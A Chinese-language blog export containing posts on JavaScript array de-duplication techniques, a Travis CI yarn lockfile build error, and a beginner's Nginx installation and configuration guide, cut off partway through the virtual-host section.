class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN, NaN, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h2 id="3-2-使用-includes-代替-indexOf-去重"><a href="#3-2-使用-includes-代替-indexOf-去重" class="headerlink" title="3.2 使用 includes 代替 indexOf 去重"></a>3.2 使用 includes 代替 indexOf 去重</h2><p>在 ES6 中引入了 <code>Array.prototype.includes()</code> 专门检测某元素是否存在于目标数组中，同时可以判断 <code>NaN</code> 类型，正好可以弥补单纯使用 <code>indexOf()</code> 进行去重的劣势：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByIncludes</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="comment">// 利用 reducer 进一步简化代码</span></span><br><span class="line">  <span class="keyword">return</span> arr.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">prev, current</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> prev.<span class="title function_">includes</span>(current) ? prev : [...prev, current];</span><br><span class="line">  &#125;, []);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h2 id="3-3-使用-filter-与-indexOf-去重"><a href="#3-3-使用-filter-与-indexOf-去重" class="headerlink" title="3.3 使用 filter 与 indexOf 去重"></a>3.3 使用 filter 与 indexOf 去重</h2><p>使用 <code>indexOf()</code> 还需要创建一个空数组，利用 ES6 的 <code>filter()</code> 方法可以免除创建一个新数组。同时其思想由原来的放入新数组，改为了判断当前遍历元素是否是数组中第一个出现的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByFilter</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> arr.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item, index</span>) &#123;</span><br><span class="line">    <span class="comment">// 看当前元素是否是数组中第一个出现的</span></span><br><span class="line">    <span class="keyword">return</span> arr.<span class="title function_">indexOf</span>(item) === index;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 [NaN].indexOf(NaN) 结果为 -1，所以无法对 NaN 不再结果中</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h1 id="5-数组排序后去重（不稳定）"><a href="#5-数组排序后去重（不稳定）" class="headerlink" title="5. 数组排序后去重（不稳定）"></a>5. 数组排序后去重（不稳定）</h1><h2 id="5-1-使用-sort-去重"><a href="#5-1-使用-sort-去重" class="headerlink" title="5.1 使用 sort 去重"></a>5.1 使用 sort 去重</h2><p><code>Array.prototypr.sort()</code> 可以对数组进行排序，我们将数组排序后，重复的元素就会并列出现，因此可以直接遍历每个元素，如果当前元素与上一个元素并非重复，那就将其放入新数组，否则就略过，直至遍历完所有数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueBySort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  arr.<span class="title function_">sort</span>();</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// 当前元素与前一个元素相比看是否相等</span></span><br><span class="line">    <span class="comment">// 注意这里不能与后一个元素比是否相等，因为如果数组中存在 undefined 的话，arr[length + 1] 会与 undefined 相等，导致 undefined 不会被添加到数组中</span></span><br><span class="line">    <span class="keyword">if</span> (arr[i] !== arr[i - <span class="number">1</span>]) &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 sort 会将数字与字符串统一转换为数字，所以当数组中存在例如 [1, “1”, 1] 这样的元素时，会原封不动的将其排列为原有的顺序，导致后面去重失败，并且 sort 也无法对引用类型进行排序。同时由于去重前的对比操作基于 <code>===</code> 操作符的判断，因此对 NaN 类型也无法判断。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  1,              &#x27;1&#x27;,</span><br><span class="line">  1,              &#x27;NaN&#x27;,</span><br><span class="line">  NaN,            NaN,</span><br><span class="line">  &#123; name: &#x27;小明&#x27; &#125;, &#123; name: &#x27;花花&#x27; &#125;,</span><br><span class="line">  &#123; name: &#x27;小明&#x27; &#125;, null,</span><br><span class="line">  undefined</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="5-2-排序后用递归思想去重"><a href="#5-2-排序后用递归思想去重" class="headerlink" title="5.2 排序后用递归思想去重"></a>5.2 排序后用递归思想去重</h2><p>上一种方法还是要创建一个新数组，如果我们想要直接操作需要去重的数组，那么还需要一点递归思想：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByRecursive</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  arr.<span class="title function_">sort</span>();</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unique</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[index] === arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">        arr.<span class="title function_">splice</span>(index, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">unique</span>(index - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">unique</span>(arr.<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>劣势与上面一致</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  1,              &#x27;1&#x27;,</span><br><span class="line">  1,              &#x27;NaN&#x27;,</span><br><span class="line">  NaN,            NaN,</span><br><span class="line">  &#123; name: &#x27;小明&#x27; &#125;, &#123; name: &#x27;花花&#x27; &#125;,</span><br><span class="line">  &#123; name: &#x27;小明&#x27; &#125;, null,</span><br><span class="line">  undefined</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="5-2-排序后用原地算法去重（仅适用于数字）"><a href="#5-2-排序后用原地算法去重（仅适用于数字）" class="headerlink" title="5.2 排序后用原地算法去重（仅适用于数字）"></a>5.2 排序后用原地算法去重（仅适用于数字）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqBySort</span>(<span class="params">nums</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sortedNums = nums.<span class="title function_">sort</span>();</span><br><span class="line">  <span class="comment">// 当前索引位置的元素期望是不重复的元素，同时改变量表示不重复元素的个数</span></span><br><span class="line">  <span class="keyword">let</span> noRepeatIndex = nums.<span class="property">length</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sortedNums.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> current = sortedNums[i];</span><br><span class="line">    <span class="comment">// 如果当前元素比 noRepeatIndex-1 位置的元素要大，就将其放置到 noRepeatIndex 的位置上，并将 noRepeatIndex 向后指</span></span><br><span class="line">    <span class="keyword">if</span> (current &gt; sortedNums[noRepeatIndex - <span class="number">1</span>]) &#123;</span><br><span class="line">      sortedNums[noRepeatIndex] = current;</span><br><span class="line">      noRepeatIndex++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sortedNums.<span class="title function_">slice</span>(<span class="number">0</span>, noRepeatIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h1><p>数组去重并非是难题，但是里面坑比较多，需要注意以下几点：</p><ul><li>利用 object keys 去重的话，注意 keys 会被转换为字符串</li><li><code>indexOf()</code> 方法与 <code>===</code> 运算符都不能判断 NaN 类型</li><li><code>sort()</code> 方法对字符串与对象的排序会对后续去重产生影响</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Travis Ci 出现 &quot;eval yarn --frozen-lockfile&quot; 构建失败解决方法</title>
      <link href="/2020/03/54fb9da805f5.html"/>
      <url>/2020/03/54fb9da805f5.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-起因"><a href="#1-起因" class="headerlink" title="1. 起因"></a>1. 起因</h1><p>在使用 Travis Ci 构建 Hexo 时在 2020 年 2 月份时出现了构件失败的情况，报错信息为 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error Your lockfile needs to be updated, but yarn was run with `--frozen-lockfile`.</span><br><span class="line">info Visit https://yarnpkg.com/en/docs/cli/install for documentation about this command.</span><br><span class="line"></span><br><span class="line">The command &quot;eval yarn --frozen-lockfile &quot; failed. Retrying, 2 of 3.</span><br></pre></td></tr></table></figure><h1 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h1><p>Travis Ci 构建 Nodejs 项目的时候，默认使用了 yarn 作为 npm 的替换安装方式。但是在 2020 年 2 月份之前，默认的安装指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn</span><br></pre></td></tr></table></figure><p>但是之后 Travis Ci 修改了默认的安装指令，将其更改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn --frozen-lockfile</span><br></pre></td></tr></table></figure><p>报错的信息显示该指令出现错误，那么这句话是什么意思的，在 yarn 文档中有这么一段话：</p><blockquote><p>如果需要可重现的依赖环境（比如在持续集成系统中），应该传入 –frozen-lockfile 标志。</p></blockquote><p>要理解这句话，事情还要从 <del>一只蝙蝠</del> npm 的包版本控制说起。我们在安装 npm 包的时候，通常会运行 <code>npm install</code> 之后还会生成一个 <code>package-lock.json</code> 文件，与之对应的，如果我们使用的是 <code>yarn install</code> 会生成一个 <code>yarn-lock.json</code> 文件，他们的目的就是记录当前我们下载下来的所有依赖包的树形结构。</p><p>那么问题来了，<code>package.json</code> 也是记录依赖的版本的，那么为什么还要有 <code>package-lock.json</code> 呢，这是因为 <code>package.json</code> 只约束了一个大版本，如 <code>&quot;hexo&quot;: &quot;^4.0.0&quot;,</code> 意思是安装版本大于 <code>4.0.0</code> 小于 <code>5.0.0</code> 的 <code>hexo</code>。</p><p>在 ci 环境下，由于要百分百模拟我们本机的编译环境，所以在 ci 端安装依赖就不能那么随心所欲的使用 <code>package.json</code> 来安装依赖包了，必须使用 <code>package-lock.json</code> ，否则万一我们依赖的某个包的新版本出现了 bug ，那么就会出现在开发机上可以编译但是在 ci 环境下不能编译的情况。</p><p>再返会看 <code>yarn --frozen-lockfile</code> 指令，其意思就是锁定当前依赖包的版本号，其进行的操作就是按照 <code>yarn-lock.json</code> 去安装。但是当一个依赖包拥有新版本时，yarn 为了防止开发者一直使用老旧版本的依赖，就会报出警告，就像我们遇到的问题那样。</p><h1 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h1><p>我们可以修改 <code>.travis.yml</code> 安装部分的脚本，来取消使用 <code>--frozen-lockfile</code> 指令：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">yarn</span></span><br></pre></td></tr></table></figure><p>但是并不推荐这么做，所以最好还是手动更新 <code>lock</code> 文件，更近的方式就是使用 <code>npm install</code> 再次进行安装即可。</p>]]></content>
      
      
      <categories>
          
          <category> CICD </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 快速使用指南</title>
      <link href="/2020/03/466378febb4e.html"/>
      <url>/2020/03/466378febb4e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h1><p>(官方安装文档)[<a href="https://nginx.org/en/#basic_http_features]">https://nginx.org/en/#basic_http_features]</a></p><p>Install the prerequisites:</p><blockquote><p>sudo apt install curl gnupg2 ca-certificates lsb-release</p></blockquote><p>To set up the apt repository for stable nginx packages, run the following command:</p><blockquote><p>echo “deb <a href="http://nginx.org/packages/ubuntu">http://nginx.org/packages/ubuntu</a> `lsb_release -cs` nginx” \<br> | sudo tee /etc/apt/sources.list.d/nginx.list</p></blockquote><p>If you would like to use mainline nginx packages, run the following command instead:</p><blockquote><p>echo “deb <a href="http://nginx.org/packages/mainline/ubuntu">http://nginx.org/packages/mainline/ubuntu</a> `lsb_release -cs` nginx” \<br> | sudo tee /etc/apt/sources.list.d/nginx.list</p></blockquote><p>Next, import an official nginx signing key so apt could verify the packages authenticity:<br>ga</p><blockquote><p>curl -fsSL <a href="https://nginx.org/keys/nginx\_signing.key">https://nginx.org/keys/nginx\_signing.key</a> | sudo apt-key add -</p></blockquote><p>Verify that you now have the proper key:</p><blockquote><p>sudo apt-key fingerprint ABF5BD827BD9BF62</p></blockquote><p>The output should contain the full fingerprint <code>573B FD6B 3D8F BC64 1079 A6AB ABF5 BD82 7BD9 BF62</code> as follows:</p><blockquote><p>pub   rsa2048 2011-08-19 [SC] [expires: 2024-06-14]<br>   573B FD6B 3D8F BC64 1079  A6AB ABF5 BD82 7BD9 BF62<br>uid   [ unknown] nginx signing key &lt;signing-<a href="mailto:key@nginx.com">key@nginx.com</a>&gt;</p></blockquote><p>To install nginx, run the following commands:</p><blockquote><p>sudo apt update<br>sudo apt install nginx</p></blockquote><p>查看版本：</p><blockquote><p>nginx -v</p></blockquote><p>查看执行指令：</p><blockquote><p>nginx -V</p></blockquote><h1 id="2-主要配置文件"><a href="#2-主要配置文件" class="headerlink" title="2. 主要配置文件"></a>2. 主要配置文件</h1><p>安装成功后，配置文件存放于 <code>/etc/nginx</code> 目录下的 <code>nginx.conf</code> 文件中，默认配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">worker_connections 768;</span><br><span class="line"># multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Basic Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">sendfile on;</span><br><span class="line">tcp_nopush on;</span><br><span class="line">tcp_nodelay on;</span><br><span class="line">keepalive_timeout 65;</span><br><span class="line">types_hash_max_size 2048;</span><br><span class="line"># server_tokens off;</span><br><span class="line"></span><br><span class="line"># server_names_hash_bucket_size 64;</span><br><span class="line"># server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">include /etc/nginx/mime.types;</span><br><span class="line">default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># SSL Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Logging Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Gzip Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">gzip on;</span><br><span class="line">gzip_disable &quot;msie6&quot;;</span><br><span class="line"></span><br><span class="line"># gzip_vary on;</span><br><span class="line"># gzip_proxied any;</span><br><span class="line"># gzip_comp_level 6;</span><br><span class="line"># gzip_buffers 16 8k;</span><br><span class="line"># gzip_http_version 1.1;</span><br><span class="line"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Virtual Host Configs</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">include /etc/nginx/conf.d/*.conf;</span><br><span class="line">include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mail &#123;</span><br><span class="line">## See sample authentication script at:</span><br><span class="line">## http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="line"># </span><br><span class="line">## auth_http localhost/auth.php;</span><br><span class="line">## pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="line">## imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="line"># </span><br><span class="line">#server &#123;</span><br><span class="line">#listen     localhost:110;</span><br><span class="line">#protocol   pop3;</span><br><span class="line">#proxy      on;</span><br><span class="line">#&#125;</span><br><span class="line"># </span><br><span class="line">#server &#123;</span><br><span class="line">#listen     localhost:143;</span><br><span class="line">#protocol   imap;</span><br><span class="line">#proxy      on;</span><br><span class="line">#&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure><p>在该文件中除了基础配置以外，又引入了两个配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 引入 /etc/nginx/conf.d/ 目录下的所有以 *.config 的文件</span><br><span class="line">include /etc/nginx/conf.d/*.conf;</span><br><span class="line"># 引入 /etc/nginx/sites-enabled/ 目录下的所有文件</span><br><span class="line">include /etc/nginx/sites-enabled/*;</span><br></pre></td></tr></table></figure><p>我们将 <code>/etc/nginx</code> 目录结构输出，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@EsunR_Shinelon:/etc/nginx# tree</span><br><span class="line">.</span><br><span class="line">├── conf.d</span><br><span class="line">├── fastcgi.conf</span><br><span class="line">├── fastcgi_params</span><br><span class="line">├── koi-utf</span><br><span class="line">├── koi-win</span><br><span class="line">├── mime.types</span><br><span class="line">├── nginx.conf</span><br><span class="line">├── proxy_params</span><br><span class="line">├── scgi_params</span><br><span class="line">├── sites-available</span><br><span class="line">│   └── default</span><br><span class="line">├── sites-enabled</span><br><span class="line">│   └── default -&gt; /etc/nginx/sites-available/default</span><br><span class="line">├── snippets</span><br><span class="line">│   ├── fastcgi-php.conf</span><br><span class="line">│   └── snakeoil.conf</span><br><span class="line">├── uwsgi_params</span><br><span class="line">└── win-utf</span><br></pre></td></tr></table></figure><p>sites-enabled 下创建了一个软连接，指向了 <code>/etc/nginx/sites-available/default</code>，这个文件就是默认的配置文件（注：根据不同的版本，有的版本的 nginx 默认配置文件存放于 <code>/etc/nginx/conf.d/default.conf</code> 中）。打开这个配置文件可以看到服务器相关的部分设置。</p><p>基础配置中，可以找到 nginx 服务器的根目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root /var/www/html;</span><br><span class="line"></span><br><span class="line"># Add index.php to the list if you are using PHP</span><br><span class="line">index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">server_name _;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">  # First attempt to serve request as file, then</span><br><span class="line">  # as directory, then fall back to displaying a 404.</span><br><span class="line">  try_files $uri $uri/ =404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部分版本的 nginx 配置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  root /usr/share/nginx/html;</span><br><span class="line">  index index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我们可以指定 404 50x 的错误页面重定向，如设置一个重定向的 404 页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_page 404 /404.html;</span><br></pre></td></tr></table></figure><h1 id="3-Nginx-启动、停止与重启"><a href="#3-Nginx-启动、停止与重启" class="headerlink" title="3. Nginx 启动、停止与重启"></a>3. Nginx 启动、停止与重启</h1><p>启动 Nginx 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx</span><br></pre></td></tr></table></figure><p>停止 Nginx 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 从容停止</span><br><span class="line">$ nginx -s quit</span><br><span class="line"></span><br><span class="line"># 立即停止</span><br><span class="line">$ nginx -s stop</span><br></pre></td></tr></table></figure><p>重启 nginx 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx -s reload</span><br></pre></td></tr></table></figure><h1 id="4-访问权限"><a href="#4-访问权限" class="headerlink" title="4. 访问权限"></a>4. 访问权限</h1><p>限制某个 ip 不允许访问根目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    deny 127.0.0.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>允许某个 ip 可以访问根目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line"># 127.0.0.1 ~ 127.0.0.100 都可以访问</span><br><span class="line">    allow 127.0.0.1/100;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>权限判定是由上自下执行的，当 allow 与 deny 交换位置后，127.0.0.1/100 也会被拒绝访问。</p></blockquote><p>如果想要精确控制某个路径，在路径前添加 <code>-</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 仅仅匹配访问 /img 目录时的请求</span><br><span class="line">location -/img &#123;</span><br><span class="line">allow all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用正则匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 只要是以 .php 结尾的文件都不允许访问</span><br><span class="line">location ~\.php$ &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-虚拟主机"><a href="#5-虚拟主机" class="headerlink" title="5. 虚拟主机"></a>5. 虚拟主机</h1><p>虚拟主机的意思是在一台服务器上运行多个服务，通过配置，Nginx 可以帮助我们管理这些服务。通常在一个主机上运行多个服务的方案有：</p><ul><li>一台主机拥有一个域名，在同一个域名下配置多个端口，如 <code>esunr.xyz:8000</code> 可以访问 app1 <code>esunr.xyz:8001</code> 可以访问 app2，我们将其称为基于端口的配置方案。</li><li>一台主机拥有多个域名，用户访问不同的域名可以访问到不同的应用，如 <code>app1.esunr.xyz</code> 访问 app1，<code>app2.esunr.xyz</code> 访问 app2，我们将其称为基于域名的配置方案。</li></ul><h2 id="5-1-基于端口的配置方案"><a href="#5-1-基于端口的配置方案" class="headerlink" title="5.1 基于端口的配置方案"></a>5.1 基于端口的配置方案</h2><p>我们已知在  Nginx 配置目录下的<code>conf.d</code> 文件夹存放的配置文件都会被 Nginx 服务所读取。那么我们在该目录下创建 <code>8001.conf</code> 文件用于配置 8001 端口的服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 